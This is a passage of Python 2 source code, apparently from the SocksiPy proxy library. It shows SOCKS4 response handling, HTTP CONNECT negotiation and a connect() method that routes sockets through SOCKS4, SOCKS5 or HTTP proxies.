			# Bad data
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if resp[1] != "\x5A":
			# Server returned an error
			self.close()
			if ord(resp[1]) in (91,92,93):
				self.close()
				raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
			else:
				raise Socks4Error((94,_socks4errors[4]))
		# Get the bound address/port
		self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
		if rmtrslv != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def __negotiatehttp(self,destaddr,destport):
		"""__negotiatehttp(self,destaddr,destport)
		Negotiates a connection through an HTTP server.
		"""
		# If we need to resolve locally, we do this now
		if self.__proxy[3] == False:
			addr = socket.gethostbyname(destaddr)
		else:
			addr = destaddr
		self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
		# We read the response until we get the string "\r\n\r\n"
		resp = self.recv(1)
		while resp.find("\r\n\r\n")==-1:
			resp = resp + self.recv(1)
		# We just need the first line to check if the connection
		# was successful
		statusline = resp.splitlines()[0].split(" ",2)
		if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		try:
			statuscode = int(statusline[1])
		except ValueError:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if statuscode != 200:
			self.close()
			raise HTTPError((statuscode,statusline[2]))
		self.__proxysockname = ("0.0.0.0",0)
		self.__proxypeername = (addr,destport)
	
	def connect(self,destpair):
		"""connect(self,despair)
		Connects to the specified destination through a proxy.
		destpar - A tuple of the IP/DNS address and the port number.
		(identical to socket's connect).
		To select the proxy server use setproxy().
		"""
		# Do a minimal input check first
		if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
			raise GeneralProxyError((5,_generalerrors[5]))
		if self.__proxy[0] == PROXY_TYPE_SOCKS5:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks5(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks4(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_HTTP:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 8080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatehttp(destpair[0],destpair[1])
		elif self.__proxy[0] == None:
			_orgsocket.connect(self,(destpair[0],destpair[1]))
		else:
			raise GeneralProxyError((4,_generalerrors[4]))

########NEW FILE########
